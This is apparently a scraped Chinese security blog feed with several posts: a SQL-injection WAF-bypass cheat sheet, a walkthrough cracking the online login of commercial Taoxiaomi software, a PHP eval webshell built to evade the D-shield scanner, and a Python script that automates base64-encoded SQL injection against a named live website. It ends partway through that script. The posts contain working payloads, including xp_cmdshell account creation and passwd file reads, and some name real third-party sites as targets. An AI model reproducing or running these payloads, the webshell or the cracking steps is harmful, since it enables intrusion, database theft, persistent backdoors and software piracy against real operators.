substr(user,1,1) from users //爆出全部的第一个字符 第二个1可以改为你要爆出的字符长度</span><br><span class="line"> select substr(user,1,20) from users</span><br><span class="line"> 没有having</span><br><span class="line"> select group_concat(user) from users</span><br><span class="line"> select max(user) from users</span><br><span class="line"> select max(replace(user,&apos;第一个获取到的内容&apos;,&apos;&apos;)) from users; //这个依次替换文字的地方就能获取所有内容</span><br><span class="line"> 没有 select</span><br><span class="line">‘ and</span><br><span class="line">substr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)</span><br><span class="line">=’a</span><br><span class="line">‘=” into outfile ‘/var/www/dump.txt</span><br><span class="line"></span><br><span class="line"> 没有and</span><br><span class="line"> http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=1),1) //返回正常</span><br><span class="line"> http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=2),1)  //返回错误</span><br><span class="line"> 没有 or</span><br><span class="line">1 || substr(user,1,1) = &apos;a&apos;</span><br><span class="line">1 || substr(user,1,1) = unhex(61)</span><br><span class="line">1 || substr(user,1,1) = lower(conv(11,10,36))</span><br><span class="line">1 || lpad(user,7,1)</span><br><span class="line">1%0b||%0blpad(user,7,1)</span><br><span class="line">突破 preg_replace preg_replace preg_replace preg_replace</span><br><span class="line">http://localhost/sqli.php?id=1+UNunionION+SEselectLECT+1,2,3--</span><br><span class="line"> 多参数处理规则：</span><br><span class="line">  web 服务器 | 参数的处理方式 | 例子 |</span><br><span class="line">+--------------------------------------------------------------------------------+</span><br><span class="line">| ASP.NET/IIS | 用逗号隔开 | par1=val1,val2 |</span><br><span class="line">| ASP/IIS | 用逗号隔开 | par1=val1,val2 |</span><br><span class="line">| PHP/Apache | 取最后一个参数的值 | par1=val2 |</span><br><span class="line">| JSP/Tomcat | 取第一个参数的值 | par1=val1 |</span><br><span class="line">| Perl/Apache | 取第一个参数的值 | par1=val1</span><br><span class="line"></span><br><span class="line">打碎关键字</span><br><span class="line">使用%打碎关键字</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 u%onion s%e%l%e%c%t 1,2,3</span><br><span class="line"> 通过注释符号打碎关键字（不适用于MYSQL&gt;4.1的情况）</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 un/**/ion se/**/lect 1,2,3</span><br><span class="line"> 使用%0b打碎关键字</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 un%0bion se%0blect 1,2,3</span><br><span class="line"> 使用%0f打碎关键字</span><br><span class="line"> http://127.0.0.1/sql.php?id=1 uni%6fn</span><br><span class="line"> </span><br><span class="line"> 更改请求方式</span><br><span class="line"> </span><br><span class="line">cookie注入</span><br><span class="line">示例代码：javascript:alert(documnet.cookie=&quot;id&quot;+escpace(&quot;51 and 1=1&quot;));</span><br><span class="line">更改method为post</span><br><span class="line"></span><br><span class="line">web服务器和WAF对一些字符的处理</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| ?test[1=2 | test_1=2 | test[1=2 |</span><br><span class="line">| ?test=% | test=% | test= |</span><br><span class="line">| ?test%00=1 | test=1 | test=1 |</span><br><span class="line">| ?test=1%001 | NULL | test=1 |</span><br><span class="line">| ?test+d=1+2 | test_d=1 2 | test d=1 2 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">+-------------------------------------------------------------------- --------+</span><br><span class="line">| Keywords | WAF | ASP/ASP.NET |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. |</span><br><span class="line">| ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx |</span><br><span class="line">| &lt;scr%ipt&gt; | &lt;scr%ipt&gt; | &lt;script&gt; |</span><br><span class="line">| &lt;if%rame&gt; | &lt;if%rame&gt; | &lt;iframe&gt; |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">突破安全狗</span><br><span class="line">安全狗本 身对 xx.asp?id=69 and 1=1 和 xx.asp?id=69 and 1=2 这些是过 滤的，可是对</span><br><span class="line">xx.asp?sqli.com=%00.&amp;xw_id=69%20 and 1=1 和 xx.asp?sqli.com=%00.&amp;xw_id=69%20 and</span><br><span class="line">1=2 却是正常，直接丢到工具就 OK 了</span><br><span class="line"></span><br><span class="line">缓冲区溢出</span><br><span class="line">突破用 C 语言编写的 WAF</span><br><span class="line">示例代码：</span><br><span class="line">http://localhost/sqli.php?id=1+and+(select 1)=(select</span><br><span class="line">0x414141414141441414141414114141414141414141414141414141</span><br><span class="line">414141414141?.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--</span><br><span class="line"></span><br><span class="line">组合攻击</span><br><span class="line">asp 和 asp.net 的 Request 对象存在一个包解析漏洞，Request 对象对于 GET 和 POST 包的解</span><br><span class="line">析过于宽松，用一句话表达就是 Request 对象它 GET 和 POST 傻傻分不清楚，稍有点 web</span><br><span class="line">开发经验的同学应该知道 Request 接收 GET,POST,COOKIE 也就是 GPC 传过来的数据，但</span><br><span class="line">是 asp 和.net 库内置的 Request 对象完全不按 RFC 标准来，下面我们可以做个测试：</span><br><span class="line">我们发送的原始包是：</span><br><span class="line">GET /1.asp HTTP/1.1</span><br><span class="line">Host: 192.168.239.129</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">t=’/**/or/**/1=1–</span><br><span class="line">结果返回如下：</span><br><span class="line">Request:’/**/or/**/1=1–</span><br><span class="line">将 python 测试脚本的 path 改为/1.aspx 测试页返回同样结果。</span><br><span class="line">我们可以看到这是一个畸形的 HTTP GET 请求包，这个包的奥秘在于 t=’/**/or/**/1=1–参数后的 8 个回车换行和 Content-Length 头，包的结构类似于一个 POST 包，而请求的方法是</span><br><span class="line">GET,最后 asp 和 asp.net 的 Request 对象成功的解析了这个畸形包取出了数据。</span><br><span class="line">所以如果 WAF 没有处理好 HTTP 包的内容，沿用常规思路处理 GET 和 POST 的逻辑的话，</span><br><span class="line">那么这个畸形包将会毁掉 WAF 的基础防御。</span><br><span class="line"></span><br><span class="line">关键字的大小写转换</span><br><span class="line">SelECt</span><br><span class="line">UnIoN</span><br><span class="line">FroM</span><br><span class="line">UnioN AIL</span><br><span class="line">GrOuP_ConCAt()</span><br><span class="line"></span><br><span class="line">/**/为注释</span><br><span class="line">/*!*/执行/*!*/里面的内容</span><br><span class="line"></span><br><span class="line">（遇狗可借鉴下面的操作）</span><br><span class="line">对参数值进行污染处理</span><br><span class="line">localhost/sqli.php?id=123 uNiOn All sEleCt/*We are bypassing the WAF*/select/*Rafay Hacking</span><br><span class="line">Artcles*/1,2,3,4,5--</span><br><span class="line">0/**/union/*!50000select*/table_name`foo`/**/…</span><br><span class="line">http://localhost/sqli.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/users</span><br><span class="line">http://localhost/sqli.aspx?id=1&apos;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell</span><br><span class="line">/*&amp;id=1*/ ?net user lucifer UrWaFisShiT? /*&amp;id=1*/ --</span><br><span class="line">/?id=1/*union*/union/*select*/select+1,2,3/*</span><br><span class="line">id=1+union/*&amp;name=*/select+1,2 （存在参数 name）</span><br><span class="line">http://www.f4le.com/member/ajax_membergroup.php?[url=mailto:00.&amp;action=post&amp;membergrou</span><br><span class="line">p=@%60]action=post&amp;membergroup=@`&apos;[/url]` Union select pwd from `%23@__admin` where</span><br><span class="line">1 or id=@`&apos;`</span><br><span class="line">http://www.f4le.com/member/ajax_membergroup.php?0dayf4le.com=%[url=mailto:00.&amp;action=p</span><br><span class="line">ost&amp;membergroup=@`]00.&amp;action=post&amp;membergroup=@`&apos;[/url]` Union select pwd from</span><br><span class="line">`%23@__admin` where 1 or id=@`&apos;`</span><br><span class="line"></span><br><span class="line">group_concat()的 1024 chars 的解决方案</span><br><span class="line">select group_concat(substr(user,1,1)) from users; //取从第一个字符到第一个字符</span><br><span class="line">select group_concat(substr(user,1,5)) from users; //取从第一个字符到第五个字符</span><br><span class="line">查询语句写到注释当中</span><br><span class="line">http://127.0.0.1/sql.php? /*!union*/**/*!select 1,user(),database()*/</span><br><span class="line">http://127.0.0.1/sql.php?/*dsadsasdd*/*!and*/*The is by pass*/*!1=2*/</span><br><span class="line">注释符</span><br><span class="line">%23 （#的url编码）[建议养成使用%23的习惯]</span><br><span class="line">-- (后面有个空格所有建议直接使用--+)</span><br><span class="line">/**/</span><br><span class="line">%00(在MS access当中可以当注释符号来用)</span><br><span class="line"></span><br><span class="line">突破防注入代码小抄</span><br><span class="line">%00&apos; UNION SELECT password FROM Users WHERE username=&apos;admin&apos;--+</span><br><span class="line">IFNULL(1, 2) 可以改写成 IF(ISNULL(1), 2, 1)</span><br><span class="line">0′union all select all`table_name`foo from`information_schema`. `tables</span><br><span class="line">value&apos;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNUL</span><br><span class="line">L(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,5</span><br><span class="line">8)), NULL, NULL#/*!0AND &apos;QDWa&apos;=&apos;QDWa</span><br><span class="line">SELECT * FROM users WHERE id LIKE 1</span><br><span class="line">SELECT FIELD%20FROM TABLE 可以写成</span><br><span class="line">%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u004</span><br><span class="line">4%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045</span><br><span class="line">&apos;A&gt; B&apos;可以写成 &apos;ANOT BETWEEN 0 AND B&apos;</span><br><span class="line">1&apos; AND SLEEP(5)# 可以写成 MScgQU5EIFNMRUVQKDUpIw==</span><br><span class="line">AND &apos;1&apos;=&apos;1&apos; 可以写成 AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87</span><br><span class="line">load_file/*foo*/(0×616263)</span><br><span class="line">http://localhost/sqli.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1</span><br><span class="line">%2C2%2Ccurrent_user</span><br><span class="line">http;//127.0.0.1/1.asp?id=(1)anandd(1=1)</span><br><span class="line">试试不要用 /etc/passwd. 用 /foo/../etc/bar/../passwd.</span><br><span class="line">Dumpfile 虽然只能导出一行数据，但必要时还是应该可以拿来和 outfile 换一下的</span><br><span class="line"></span><br><span class="line">一些mysql函数</span><br><span class="line">substr(‘abc’,1,1) = ‘a’</span><br><span class="line">substr(‘abc’ from 1 for 1) = ‘a’</span><br><span class="line">substring(‘abc’,1,1) = ‘a’</span><br><span class="line">substring(‘abc’ from 1 for 1) = ‘a’</span><br><span class="line">mid(‘abc’,1,1) = ‘a’</span><br><span class="line">mid(‘abc’ from 1 for 1) = ‘a’</span><br><span class="line">lpad(‘abc’,1,space(1)) = ‘a’</span><br><span class="line">rpad(‘abc’,1,space(1)) = ‘a’</span><br><span class="line">left(‘abc’,1) = ‘a’</span><br><span class="line">reverse(right(reverse(‘abc’),1)) = ‘a’</span><br><span class="line">insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’</span><br><span class="line">space(0) = trim(version()from(version()))</span><br><span class="line">locate(‘a’,&apos;abc’)</span><br><span class="line">position(‘a’,&apos;abc’)</span><br><span class="line">position(‘a’ IN ‘abc’)</span><br><span class="line">instr(‘abc’,&apos;a’)</span><br><span class="line">substring_index(‘ab’,&apos;b’,1)</span><br><span class="line">length(trim(leading ‘a’ FROM ‘abc’))</span><br><span class="line">length(replace(‘abc’, ‘a’, ”))</span><br><span class="line">strcmp(‘a’,&apos;a’)</span><br><span class="line">mod(‘a’,&apos;a’)</span><br><span class="line">find_in_set(‘a’,&apos;a’)</span><br><span class="line">field(‘a’,&apos;a’)</span><br><span class="line">count(concat(‘a’,&apos;a’))</span><br><span class="line">length()</span><br><span class="line">bit_length()</span><br><span class="line">char_length()</span><br><span class="line">octet_length()</span><br><span class="line">bit_count()</span><br><span class="line"></span><br><span class="line">姿势大全</span><br><span class="line">新姿势 1:</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x71) = -1</span><br><span class="line">变换姿势: /*mid()函数用于得到字符串的一部分*/</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1)=&apos;*&apos;  //获取user表中字段的&apos;user&apos;然后输出字段内容里面有个*的</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1)=0x2a</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1)=unhex(&apos;2a&apos;)</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1) regexp &apos;[*]&apos;</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1) like &apos;*&apos;</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1) rlike &apos;[*]&apos;</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR ord(mid(password,1,1))=42</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR ascii(mid(password,1,1))=42</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR find_in_set(&apos;2a&apos;,hex(mid(password,1,1)))=1</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR position(0x2a in password)=1</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR locate(0x2a,password)=1</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR substr(password,1,1)=0x2a</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR substring(password,1,1)=0x2a</span><br><span class="line">新姿势 2:</span><br><span class="line">false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K</span><br><span class="line">true !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L</span><br><span class="line">true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M</span><br><span class="line">floor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class="line">ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O</span><br><span class="line">floor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P</span><br><span class="line">ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q</span><br><span class="line">ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R</span><br><span class="line">floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S</span><br><span class="line">floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure><h3 id="过WTS-WAF办法"><a href="#过WTS-WAF办法" class="headerlink" title="过WTS-WAF办法"></a>过WTS-WAF办法</h3><p>测试站点：[WTS-WAF拦截提示]<a href="http://www.gwpstools.com/cn/about_list.asp?id=140%20and%201=2" target="_blank" rel="noopener">http://www.gwpstools.com/cn/about_list.asp?id=140%20and%201=2</a><br>bypass：]<a href="http://www.gwpstools.com/cn/about_list.asp?id=140" target="_blank" rel="noopener">http://www.gwpstools.com/cn/about_list.asp?id=140</a> an%d 1=2<br>判断出是ASSCESS数据库：<a href="http://www.gwpstools.com/cn/about_list.asp?id=140%20an%d%20ex%sits%20(se%lect%20*%20from%20msysobjects)%3E0" target="_blank" rel="noopener">http://www.gwpstools.com/cn/about_list.asp?id=140%20an%d%20ex%sits%20(se%lect%20*%20from%20msysobjects)%3E0</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解淘小秘【拼多多版】最新版</title>
      <link href="/posts/8d06f8ce.html"/>
      <url>/posts/8d06f8ce.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>正常双修的星期天，下午准备上学。早上顺便学一下破解，看到shark恒第19课，破解网络认证<br>然后看到破解的是淘小秘的，上网下了个新的。折腾了一会，成功了= =<br><img src="http://pic.netbian.com/uploads/allimg/170819/195530-1503143730e279.jpg" alt="195530-1503143730e279.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>新版淘小秘下载：<a href="http://www.taoxiaomi.cn/download/" target="_blank" rel="noopener">http://www.taoxiaomi.cn/download/</a><br>下载之后顺便安装一个（我安的是拼多多的）<br><img src="https://s1.ax1x.com/2018/12/02/FuQCJf.png" alt="FuQCJf.png"><br>常规操作：查壳，查语言，入OD<br>1.PEID查壳，发现是ASP加密的壳<br>..<img src="https://s1.ax1x.com/2018/12/02/FuQFSS.png" alt="FuQFSS.png"><br>2.查一下什么语言写的，VC6写的<br><img src="https://s1.ax1x.com/2018/12/02/FuQewn.png" alt="FuQewn.png"><br>3.载入OD发现可以ESP定律脱壳，然后发现脱了之后有毛病，使用Aspack Stripper脱壳<br><img src="https://s1.ax1x.com/2018/12/02/FuQ8OJ.png" alt="FuQ8OJ.png"><br>脱壳之后在查，ok，脱掉<br><img src="https://s1.ax1x.com/2018/12/02/FuQJm9.png" alt="FuQJm9.png"><br>载入OD，成功看到VC6的OEP<br><img src="https://s1.ax1x.com/2018/12/02/FuQYwR.png" alt="FuQYwR.png"><br>输入万能断点，401000<br><img src="https://s1.ax1x.com/2018/12/02/FuQaY6.png" alt="FuQaY6.png"><br>然后右键点击查找（二进制字符串）输入：FF 25,定位窗体<br><img src="https://s1.ax1x.com/2018/12/02/FuQrOH.md.png" alt="FuQrOH.md.png"></p><p><img src="https://s1.ax1x.com/2018/12/02/FuQcTI.png" alt="FuQcTI.png"><br>Ctrl+F搜索push 10001,寻找各种窗体，然后对刚刚那个进行替换，ok，完事<br><img src="https://s1.ax1x.com/2018/12/02/FuQWff.png" alt="FuQWff.png"><br>返回原来的进行替换<br><img src="https://s1.ax1x.com/2018/12/02/FuQ41S.md.png" alt="FuQ41S.md.png"><br>进行保存，打开一看进了会员中心<br><img src="https://s1.ax1x.com/2018/12/02/FuQ56g.md.png" alt="FuQ56g.md.png"><br>其实还能替换其他的窗体位置进入其他的地方</p><p>总结：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">破解联网认证的基本方法是跳过登陆的框框，有壳脱壳或者打补丁</span><br><span class="line">然后载入OD</span><br><span class="line">1.用万能断点401000，然后搜索二进制字符串FF 25</span><br><span class="line">2.搜索push 10001</span><br><span class="line">3.看见其他的窗体对原来的进行替换，保存文件</span><br></pre></td></tr></table></figure><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从一道CTF题得到的思路从而产生的过D盾一句话</title>
      <link href="/posts/7379a7c9.html"/>
      <url>/posts/7379a7c9.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个过D盾的一句话纯属是我瞎搞，搞出来的。= =我也一脸懵逼怎么就过了= =<br><img src="https://s1.ax1x.com/2018/12/01/FngYp8.md.jpg" alt="FngYp8.md.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>D盾的最新版的，php环境是5.6的<br><img src="https://s1.ax1x.com/2018/12/01/Fng07n.png" alt="Fng07n.png"><br>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); </span><br><span class="line">$u=$_GET[&apos;u&apos;];</span><br><span class="line">$i=$_GET[&apos;i&apos;];</span><br><span class="line">if ($u=!&quot;a&quot;)&#123;</span><br><span class="line">die(&apos;die....&apos;);</span><br><span class="line">&#125;</span><br><span class="line">@eval(&quot;echo $i&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>测试结果：<br><img src="https://s1.ax1x.com/2018/12/01/Fngrt0.png" alt="Fngrt0.png"></p><p>菜刀连接（这配置自己弄的好像有毛病）<br><img src="https://s1.ax1x.com/2018/12/01/Fng6pT.png" alt="Fng6pT.png"></p><p><img src="https://s1.ax1x.com/2018/12/01/FngfB9.png" alt="FngfB9.png"></p><p>视频：</p><iframe width="560" height="315" src="https://www.youtube.com/embed/1jYcmnaek4A" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>推荐一篇文章：<a href="https://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">那些强悍的PHP一句话后门 - FreeBuf互联网安全新媒体平台</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>base64注入脚本</title>
      <link href="/posts/454cb2d.html"/>
      <url>/posts/454cb2d.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上个星期说了base64注入，这个星期写个脚本不过分吧。[滑稽]，学校的校运会实数无聊<br>比初中的校运会少了太多….<br><img src="http://pic.netbian.com/uploads/allimg/180808/091612-1533690972027f.jpg" alt="091612-1533690972027f.jpg"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=451113443&auto=1&height=66"></iframe><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>注明：这个脚本只是针对没有任何防御的url<br>测试网站：<a href="http://yyyhhg.com/newsDetail.php?id=MTM" target="_blank" rel="noopener">http://yyyhhg.com/newsDetail.php?id=MTM</a><br>PS:纯属测试，任何违法行为由你自己负责</p><p>思路：<br><code>1.先判断是否有注入</code><br><code>2.拼接各种payload</code><br><code>3.读取数据</code></p><p>问题：<code>在后面读取数据的时候，如何定位到数据呢。然后列出来，我这里解决不了，就url+注入语句拼接起来，然后自己看，然后在输入到脚本</code></p><p>代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">def sql_injection():</span><br><span class="line">    payload=base64.b64encode(bytes(&apos;13 and 1=1&apos;,encoding=&apos;utf-8&apos;))</span><br><span class="line">    payload2=base64.b64encode(bytes(&apos;13 and 1=2&apos;,encoding=&apos;utf-8&apos;))</span><br><span class="line">    payload3=base64.b64encode(bytes(&apos;13 order by 1&apos;,encoding=&apos;utf-8&apos;))</span><br><span class="line">    urls=&apos;http://yyyhhg.com/newsDetail.php?id=’</span><br><span class="line">    headers=&#123;&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&apos;&#125;</span><br><span class="line">    rqt=requests.get(url=urls+bytes.decode(payload),headers=headers)</span><br><span class="line">    rqt2=requests.get(url=urls + bytes.decode(payload2), headers=headers)</span><br><span class="line">    if rqt.text!=rqt2.text:  //判断是否有注入</span><br><span class="line">        print(&apos;[+] There is SQL injection.&apos;)</span><br><span class="line">        rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)</span><br><span class="line">        if rqt.text==rqt3.text:</span><br><span class="line">            print(&apos;[+] Try running fields&apos;)</span><br><span class="line">            for i in range(1,101):</span><br><span class="line">                payload3=base64.b64encode(bytes(&apos;13 order by &#123;&#125;&apos;.format(i),encoding=&apos;utf-8&apos;)) //跑字段范围1-100</span><br><span class="line">                rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)</span><br><span class="line">                if rqt3.text!=rqt.text: </span><br><span class="line">                    global field</span><br><span class="line">                    field=i-1</span><br><span class="line">                    print(&apos;[+] field:&#123;&#125;&apos;.format(i-1))</span><br><span class="line">                    payload3=base64.b64encode(bytes(&apos;13 order by &#123;&#125;&apos;.format(field), encoding=&apos;utf-8&apos;)) //将获取到的字段写入到txt</span><br><span class="line">                    print(&apos;[+] payload 3:&#123;&#125;&apos;.format(bytes.decode(base64.b64decode(payload3))))</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        if field!=&apos;&apos;:</span><br><span class="line">            xj=open(&apos;sqldk.txt&apos;,&apos;w&apos;)</span><br><span class="line">            xj.close()</span><br><span class="line">            for u in range(1,field+1):</span><br><span class="line">                print(&apos;,&apos;+str(u),end=&apos;&apos;,file=open(&apos;sqldk.txt&apos;,&apos;a&apos;))</span><br><span class="line">            with open(&apos;sqldk.txt&apos;,&apos;r&apos;) as p:</span><br><span class="line">                reads=p.read().replace(&apos;,1&apos;,&apos;1&apos;)</span><br><span class="line">                payload4=base64.b64encode(bytes(&apos;0 union select &#123;&#125;&apos;.format(reads),encoding=&apos;utf-8&apos;)) //获取显位</span><br><span class="line">                print(&apos;[+] obtain payload 4:&apos;,bytes.decode(base64.b64decode(payload4)))</span><br><span class="line">                rqt4=requests.get(url=urls+bytes.decode(payload4),headers=headers)</span><br><span class="line">                print(&apos;[+] Open URL to manually locate the display:&apos;,rqt4.url)</span><br><span class="line">                user=input(&apos;display:&apos;)</span><br><span class="line">                print(&apos;[+] The number of digits you enter is:&apos;,user)</span><br><span class="line">                payload4=bytes.decode(base64.b64decode(payload4)).replace(user,&apos;database()&apos;) //获取数据库名称</span><br><span class="line">                rqt5=requests.get(url=urls+bytes.decode(base64.b64encode(bytes(payload4,encoding=&apos;utf-8&apos;))),headers=headers)</span><br><span class="line">                print(&apos;[+] Manually open the URL to get the database name:&apos;,rqt5.url)</span><br><span class="line">                user2=input(&apos;database:&apos;)</span><br><span class="line">                js=binascii.hexlify(bytes(user2,encoding=&apos;utf-8&apos;))</span><br><span class="line">                js=&apos;0x&#123;&#125;&apos;.format(bytes.decode(js))</span><br><span class="line">                payload5=base64.b64encode(bytes(payload4.replace(&apos;database()&apos;,&apos;group_concat(table_name)&apos;)+&apos; &apos;+&apos;from information_schema.tables where table_schema=&#123;&#125;&apos;.format(js),encoding=&apos;utf-8&apos;)) //读取所有表名</span><br><span class="line">                rqt6=requests.get(url=urls+bytes.decode(payload5),headers=headers)</span><br><span class="line">                if rqt6.status_code==200:</span><br><span class="line">                    print(&apos;[+] Open the URL input field:&apos;,rqt6.url)</span><br><span class="line">                    user3=input(&apos;table_name:&apos;)</span><br><span class="line">                    payload6=bytes.decode(base64.b64decode(payload5)).replace(&apos;table_name&apos;,&apos;column_name&apos;).replace(&apos;tables&apos;,&apos;columns&apos;)+&apos; and table_name=&#123;&#125;&apos;.format(&apos;0x&apos;+bytes.decode(binascii.hexlify(bytes(user3,encoding=&apos;utf-8&apos;))))</span><br><span class="line">                    payload6=base64.b64encode(bytes(payload6,encoding=&apos;utf-8&apos;)) //读取所有字段名</span><br><span class="line">                    rqt7=requests.get(url=urls+bytes.decode(payload6),headers=headers)</span><br><span class="line">                    if rqt7.status_code==200:</span><br><span class="line">                        print(&apos;[+] Open URL input field name:&apos;,rqt7.url)</span><br><span class="line">                        print(&apos;[+] If there are multiple field names, separate them&apos;)</span><br><span class="line">                        user4=input(&apos;column_name:&apos;)</span><br><span class="line">                        payload7=base64.b64encode(bytes(&apos;0 union select &apos;+reads.replace(user,&apos;group_concat(&#123;&#125;)&apos;.format(user4))+&apos; from &#123;&#125;&apos;.format(user3),encoding=&apos;utf-8&apos;)) //读取字段内容</span><br><span class="line">                        rqt8=requests.get(url=urls+bytes.decode(payload7),headers=headers)</span><br><span class="line">                        if 